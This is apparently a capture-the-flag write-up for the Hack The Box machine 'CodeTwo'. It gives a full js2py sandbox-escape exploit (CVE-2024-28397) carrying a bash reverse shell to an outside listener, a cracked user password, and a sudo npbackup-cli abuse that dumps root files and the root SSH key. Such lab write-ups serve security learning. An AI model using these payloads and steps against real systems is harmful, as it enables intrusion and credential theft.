- - - 
created : 23-08-2025 

Tags : #easy 

Released on 16 Aug 2025 (Season 8)
- - - 
# Recon
## Rustscan - Nmap

First we add the target IP to our /etc/hosts file, then we use [Rustscan](../../../3%20-%20Tags/Hacking%20Tools/Rustscan.md) that will pass the result to [Nmap](../../../3%20-%20Tags/Hacking%20Tools/Nmap.md):

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Code2]
└─$ rustscan -a code.htb -- -A      

Open 10.10.11.82:22
Open 10.10.11.82:8000

PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)

8000/tcp open  http    syn-ack ttl 63 Gunicorn 20.0.4
|_http-server-header: gunicorn/20.0.4
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
|_http-title: Welcome to CodeTwo
```

# Enumeration
## HTTP (8000)
### Gobuster

We can use [Gobuster](../../../3%20-%20Tags/Hacking%20Tools/Gobuster.md) to start [Enumeration](../../../3%20-%20Tags/Hacking%20Concepts/Enumeration.md) on the target:

```
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Code2]
└─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt  -u http://code.htb:8000 

/download             (Status: 200) [Size: 10696]
/login                (Status: 200) [Size: 667]
/register             (Status: 200) [Size: 651]
/logout               (Status: 302) [Size: 189] [--> /]
/dashboard            (Status: 302) [Size: 199] [--> /login]
```

We can register to see what's in the dashboard:

![Pasted image 20250823131114.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250823131114.png)

We can basically run [Javascript](../../../3%20-%20Tags/Programming%20Languages/Javascript.md) code here, i think this is the intended way in:

![Pasted image 20250823170337.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250823170337.png)
# Exploit
https://www.cve.org/CVERecord?id=CVE-2024-28397

CVE-2024-28397 is a sandbox escape vulnerability in js2py that allows attackers to break out of the [JavaScript](../../../3%20-%20Tags/Programming%20Languages/Javascript.md) execution environment and execute [Python](../../../3%20-%20Tags/Programming%20Languages/Python.md) code. The vulnerability exists because js2py doesn't properly isolate JavaScript objects from Python's object model.

**How the Exploit Works:**

1. JavaScript objects in js2py maintain references to Python's internal structures
2. Through `Object.getOwnPropertyNames`, we can access Python's `__getattribute__` method
3. We traverse Python's class hierarchy using `__class__.__base__`
4. We locate the `subprocess.Popen` class
5. We execute system commands through Popen

**Exploit Payload:** 

```javascript
// CVE-2024-28397 → js2py sandbox escape → Popen → reverse shell
let cmd = "bash -c 'bash -i >& /dev/tcp/10.10.14.56/1337 0>&1'";
let hacked, bymarve, n11;
let getattr, obj;

// Step 1: Access Python's internal attributes through JS objects
hacked = Object.getOwnPropertyNames({});
bymarve = hacked.__getattribute__;
n11 = bymarve("__getattribute__");

// Step 2: Get to Python's base object class
obj = n11("__class__").__base__;
getattr = obj.__getattribute__;

// Step 3: Recursive function to find subprocess.Popen in Python's class hierarchy
function findpopen(o) {
  let result;
  for (let i in o.__subclasses__()) {
    let item = o.__subclasses__()[i];
    if (item.__module__ == "subprocess" && item.__name__ == "Popen") {
      return item;
    }
    if (item.__name__ != "type" && (result = findpopen(item))) {
      return result;
    }
  }
}

// Step 4: Execute the reverse shell command
findpopen(obj)(cmd, -1, null, -1, -1, -1, null, null, true).communicate();
"OK";
```

Make sure to change line 2 and set your IP and eventually PORT: `/dev/tcp/10.10.X.X/1337`

We setup the [Netcat](../../../3%20-%20Tags/Hacking%20Tools/Netcat.md) listener and run the code:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Code2]
└─$ nc -lvnp 1337 
listening on [any] 1337 ...
connect to [10.10.14.56] from (UNKNOWN) [10.10.11.82] 41030
bash: cannot set terminal process group (855): Inappropriate ioctl for device
bash: no job control in this shell
app@codetwo:~/app$ whoami
whoami
app
```

Now we have a [Reverse Shell](../../../3%20-%20Tags/Hacking%20Concepts/Reverse%20Shell.md) as `app` user, we can even perform [Shell Stabilization](../../../3%20-%20Tags/Hacking%20Concepts/Shell%20Stabilization.md) to work a bit better:

```bash
app@codetwo:/tmp$ export TERM=xterm
export TERM=xterm
app@codetwo:/tmp$ python3 -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
app@codetwo:/tmp$ ^Z
zsh: suspended  nc -lvnp 1337
     
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Code2]
└─$ stty raw -echo;fg
[1]  + continued  nc -lvnp 1337
                             reset
app@codetwo:/tmp$ 
```
# Lateral Movement - Privilege Escalation
## App to Marco

We can find users.db, use [SQLite3](../../../3%20-%20Tags/Hacking%20Tools/SQLite3.md) to read hashed passwords:

```bash
app@codetwo:~/app/instance$ sqlite3 users.db 
SQLite version 3.31.1 2020-01-27 19:55:54
Enter ".help" for usage hints.

sqlite> .dump
PRAGMA foreign_keys=OFF;
BEGIN TRANSACTION;
CREATE TABLE user (
        id INTEGER NOT NULL, 
        username VARCHAR(80) NOT NULL, 
        password_hash VARCHAR(128) NOT NULL, 
        PRIMARY KEY (id), 
        UNIQUE (username)
);
INSERT INTO user VALUES(1,'marco','HTB{REDACTED_PASSWD}');
INSERT INTO user VALUES(2,'app','HTB{REDACTED_PASSWD}');
CREATE TABLE code_snippet (
        id INTEGER NOT NULL, 
        user_id INTEGER NOT NULL, 
        code TEXT NOT NULL, 
        PRIMARY KEY (id), 
        FOREIGN KEY(user_id) REFERENCES user (id)
);
COMMIT;
sqlite> 
```

We can [Decipher](../../../3%20-%20Tags/Hacking%20Concepts/Decipher.md) the `marco` password hash with https://crackstation.net/:
|649c9d65a206a75f5abe509fe128bce5  |  md5  |    sweetangelbabylove     |
### SSH (22)

We can use the found password to acces on [SSH](../../../3%20-%20Tags/Hacking%20Concepts/SSH.md) as the new user and cat the first flag:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Code2]
└─$ ssh marco@code.htb    

marco@codetwo:~$ cat user.txt 
    HTB{REDACTED_PASSWD}
```
## Marco to Root

We start [Privilege Escalation](../../../3%20-%20Tags/Hacking%20Concepts/Privilege%20Escalation.md) to `root` user, checking for `sudo -l`:

```bash
marco@codetwo:~$ sudo -l
Matching Defaults entries for marco on codetwo:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User marco may run the following commands on codetwo:
    (ALL : ALL) NOPASSWD: /usr/local/bin/npbackup-cli
```

That's interesting.

Then SUID files:

```
marco@codetwo:~$ find / user root -perm -4000 -print 2>/dev/null
/usr/bin/at
/usr/bin/fusermount
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/mount
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/chfn
/usr/bin/umount
/usr/bin/newgrp
/usr/bin/su
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
```

We can read the `npbackup.conf` file in home:

```
marco@codetwo:~$ cat npbackup.conf 
conf_version: 3.0.1
audience: public
repos:
  default:
    repo_uri: 
      __NPBACKUP__wd9051w9Y0p4ZYWmIxMqKHP81/phMlzIOYsL01M9Z7IxNzQzOTEwMDcxLjM5NjQ0Mg8PDw8PDw8PDw8PDw8PD6yVSCEXjl8/9rIqYrh8kIRhlKm4UPcem5kIIFPhSpDU+e+E__NPBACKUP__
    repo_group: default_group
    backup_opts:
      paths:
      - /home/app/app/
      source_type: folder_list
      exclude_files_larger_than: 0.0
    repo_opts:
      repo_password: 
        __NPBACKUP__v2zdDN21b0c7TSeUZlwezkPj3n8wlR9Cu1IJSMrSctoxNzQzOTEwMDcxLjM5NjcyNQ8PDw8PDw8PDw8PDw8PD0z8n8DrGuJ3ZVWJwhBl0GHtbaQ8lL3fB0M=__NPBACKUP__
      retention_policy: {}
      prune_max_unused: 0
    prometheus: {}
    env: {}
    is_protected: false
groups:
  default_group:
    backup_opts:
      paths: []
      source_type:
      stdin_from_command:
      stdin_filename:
      tags: []
      compression: auto
      use_fs_snapshot: true
      ignore_cloud_files: true
      one_file_system: false
      priority: low
      exclude_caches: true
      excludes_case_ignore: false
      exclude_files:
      - excludes/generic_excluded_extensions
      - excludes/generic_excludes
      - excludes/windows_excludes
      - excludes/linux_excludes
      exclude_patterns: []
      exclude_files_larger_than:
      additional_parameters:
      additional_backup_only_parameters:
      minimum_backup_size_error: 10 MiB
      pre_exec_commands: []
      pre_exec_per_command_timeout: 3600
      pre_exec_failure_is_fatal: false
      post_exec_commands: []
      post_exec_per_command_timeout: 3600
      post_exec_failure_is_fatal: false
      post_exec_execute_even_on_backup_error: true
      post_backup_housekeeping_percent_chance: 0
      post_backup_housekeeping_interval: 0
    repo_opts:
      repo_password:
      repo_password_command:
      minimum_backup_age: 1440
      upload_speed: 800 Mib
      download_speed: 0 Mib
      backend_connections: 0
      retention_policy:
        last: 3
        hourly: 72
        daily: 30
        weekly: 4
        monthly: 12
        yearly: 3
        tags: []
        keep_within: true
        group_by_host: true
        group_by_tags: true
        group_by_paths: false
        ntp_server:
      prune_max_unused: 0 B
      prune_max_repack_size:
    prometheus:
      backup_job: ${MACHINE_ID}
      group: ${MACHINE_GROUP}
    env:
      env_variables: {}
      encrypted_env_variables: {}
    is_protected: false
identity:
  machine_id: ${HOSTNAME}__blw0
  machine_group:
global_prometheus:
  metrics: false
  instance: ${MACHINE_ID}
  destination:
  http_username:
  http_password:
  additional_labels: {}
  no_cert_verify: false
global_options:
  auto_upgrade: false
  auto_upgrade_percent_chance: 5
  auto_upgrade_interval: 15
  auto_upgrade_server_url:
  auto_upgrade_server_username:
  auto_upgrade_server_password:
  auto_upgrade_host_identity: ${MACHINE_ID}
  auto_upgrade_group: ${MACHINE_GROUP}

```
### LinPEAS

We can transfer  [LinPEAS](../../../3%20-%20Tags/Hacking%20Tools/LinPEAS.md) in the /tmp folder via [SSH](../../../3%20-%20Tags/Hacking%20Concepts/SSH.md):

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Code2]
└─$ scp /usr/share/peass/linpeas/linpeas.sh marco@code.htb:/tmp/linpeas.sh

marco@code.htb's password: 
```

And we run it:

```bash
$ ./linpeas.sh 

**==Vulnerable to CVE-2021-3560==**

╔══════════╣ Analyzing Htpasswd Files (limit 70)
-rw-r--r-- 1 root root 47 Jan 11  2020 /usr/lib/python3/dist-packages/fail2ban/tests/files/config/apache-auth/basic/authz_owner/.htpasswd
username:$apr1$1f5oQUl4$21lLXSN7xQOPtNsj5s4Nk/
-rw-r--r-- 1 root root 47 Jan 11  2020 /usr/lib/python3/dist-packages/fail2ban/tests/files/config/apache-auth/basic/file/.htpasswd
username:$apr1$uUMsOjCQ$.BzXClI/B/vZKddgIAJCR.
-rw-r--r-- 1 root root 117 Jan 11  2020 /usr/lib/python3/dist-packages/fail2ban/tests/files/config/apache-auth/digest_anon/.htpasswd
username:digest anon:25e4077a9344ceb1a88f2a62c9fb60d8
05bbb04
anonymous:digest anon:faa4e5870970cf935bb9674776e6b26a
-rw-r--r-- 1 root root 62 Jan 11  2020 /usr/lib/python3/dist-packages/fail2ban/tests/files/config/apache-auth/digest/.htpasswd
username:digest private area:fad48d3a7c63f61b5b3567a4105bbb04
-rw-r--r-- 1 root root 62 Jan 11  2020 /usr/lib/python3/dist-packages/fail2ban/tests/files/config/apache-auth/digest_time/.htpasswd
username:digest private area:fad48d3a7c63f61b5b3567a4105bbb04
-rw-r--r-- 1 root root 62 Jan 11  2020 /usr/lib/python3/dist-packages/fail2ban/tests/files/config/apache-auth/digest_wrongrelm/.htpasswd
username:wrongrelm:99cd340e1283c6d0ab34734bd47bdc30
4105bbb04
            
╔══════════╣ Searching root files in home dirs (limit 30)
/home/                 
/home/app/.mysql_history
/home/app/.python_history
/home/app/.bash_history
/home/app/app/static/css/styles.css
/home/app/app/templates/base.html
/home/app/.sqlite_history
/root/

╔══════════╣ Searching tables inside readable .db/.sql/.sqlite files (limit 100)
Found /home/app/app/instance/users.db: SQLite 3.x database, last written using SQLite version 3031001                                                                                                                                        
Found /var/lib/command-not-found/commands.db: SQLite 3.x database, last written using SQLite version 3031001
Found /var/lib/fail2ban/fail2ban.sqlite3: regular file, no read permission
Found /var/lib/fwupd/pending.db: SQLite 3.x database, last written using SQLite version 3031001
Found /var/lib/PackageKit/transactions.db: SQLite 3.x database, last written using SQLite version 3031001
```

Tried the found CVE, that won't work.
### Exploit

We can use the found script, first we try to run the `help` command:

```bash
marco@codetwo:~$ /usr/local/bin/npbackup-cli --help
usage: npbackup-cli [-h] [-c CONFIG_FILE] [--repo-name REPO_NAME] [--repo-group REPO_GROUP] [-b]
                   [-f] [-r RESTORE] [-s] [--ls [LS]] [--find FIND] [--forget FORGET] [--policy]
                   [--housekeeping] [--quick-check] [--full-check] [--check CHECK]
                   [--prune [PRUNE]] [--prune-max] [--unlock] [--repair-index]
                   [--repair-packs REPAIR_PACKS] [--repair-snapshots] [--repair REPAIR] [--recover]
                   [--list LIST] [--dump DUMP] [--stats [STATS]] [--raw RAW] [--init]
                   [--has-recent-snapshot] [--restore-includes RESTORE_INCLUDES]
                   [--snapshot-id SNAPSHOT_ID] [--json] [--stdin] [--stdin-filename STDIN_FILENAME]  
                   [-v] [-V] [--dry-run] [--no-cache] [--license] [--auto-upgrade]                   
                   [--log-file LOG_FILE] [--show-config]                                             
                   [--external-backend-binary EXTERNAL_BACKEND_BINARY]                               
                   [--group-operation GROUP_OPERATION] [--create-key CREATE_KEY]                     
                   [--create-backup-scheduled-task CREATE_BACKUP_SCHEDULED_TASK]                     
                   [--create-housekeeping-scheduled-task CREATE_HOUSEKEEPING_SCHEDULED_TASK]         
                   [--check-config-file]                                      
```

Now we to run the program on the conf file:

```
marco@codetwo:~$ sudo npbackup-cli -c npbackup.conf -b -f
2025-08-23 20:49:41,036 :: INFO :: npbackup 3.0.1-linux-UnknownBuildType-x64-legacy-public-3.8-i 2025032101 - Copyright (C) 2022-2025 NetInvent running as root
2025-08-23 20:49:41,066 :: INFO :: Loaded config 4E3B3BFD in /home/marco/npbackup.conf
2025-08-23 20:49:41,078 :: INFO :: Running backup of ['/home/app/app/'] to repo default
2025-08-23 20:49:42,290 :: INFO :: Trying to expanding exclude file path to /usr/local/bin/excludes/generic_excluded_extensions
2025-08-23 20:49:42,290 :: ERROR :: Exclude file 'excludes/generic_excluded_extensions' not found
2025-08-23 20:49:42,290 :: INFO :: Trying to expanding exclude file path to /usr/local/bin/excludes/generic_excludes
2025-08-23 20:49:42,291 :: ERROR :: Exclude file 'excludes/generic_excludes' not found
2025-08-23 20:49:42,291 :: INFO :: Trying to expanding exclude file path to /usr/local/bin/excludes/windows_excludes
2025-08-23 20:49:42,291 :: ERROR :: Exclude file 'excludes/windows_excludes' not found
2025-08-23 20:49:42,291 :: INFO :: Trying to expanding exclude file path to /usr/local/bin/excludes/linux_excludes
2025-08-23 20:49:42,291 :: ERROR :: Exclude file 'excludes/linux_excludes' not found
2025-08-23 20:49:42,291 :: WARNING :: Parameter --use-fs-snapshot was given, which is only compatible with Windows
using parent snapshot 35a4dac3

Files:           1 new,     4 changed,     8 unmodified
Dirs:            0 new,     7 changed,     2 unmodified
Added to the repository: 24.318 KiB (14.773 KiB stored)

processed 13 files, 48.910 KiB in 0:00
snapshot dd4c2b97 saved
2025-08-23 20:49:43,471 :: INFO :: Backend finished with success
2025-08-23 20:49:43,473 :: INFO :: Processed 48.9 KiB of data
2025-08-23 20:49:43,473 :: ERROR :: Backup is smaller than configured minmium backup size
2025-08-23 20:49:43,473 :: ERROR :: Operation finished with failure
2025-08-23 20:49:43,473 :: INFO :: Runner took 2.396712 seconds for backup
2025-08-23 20:49:43,475 :: INFO :: Operation finished
2025-08-23 20:49:43,481 :: INFO :: ExecTime = 0:00:02.448765, finished, state is: errors.
```

We can use this [Exploit](../../../3%20-%20Tags/Hacking%20Concepts/Exploit.md) found on [Github](../../../3%20-%20Tags/Hacking%20Concepts/Github.md):

https://github.com/AliElKhatteb/npbackup-cli-priv-escalation

1. **Transfer the `npbackup.conf`** file to the vulnerable machine.:

```bash
scp npbackup.conf marco@code.htb:/home/marco/npbackup2.conf
```

2. **Edit the configuration**: Add the path of the file or folder you want to read in line 11 of `npbackup.conf`.
3. **Execute the backup command**:
 
```bash
sudo /usr/local/bin/npbackup-cli -c npbackup2.conf --backup
```

```bash
sudo /usr/local/bin/npbackup-cli -c npbackup2.conf --dump /root/root.txt --snapshot-id ADD_ID
```

```
marco@codetwo:~$ sudo /usr/local/bin/npbackup-cli -c npbackup2.conf --dump /root/root.txt --snapshot-id b3525026

    HTB{REDACTED_FLAG}
```

Following the exact same process we can read the /root/.ssh/id_rsa key and gain root access.

Pwned !!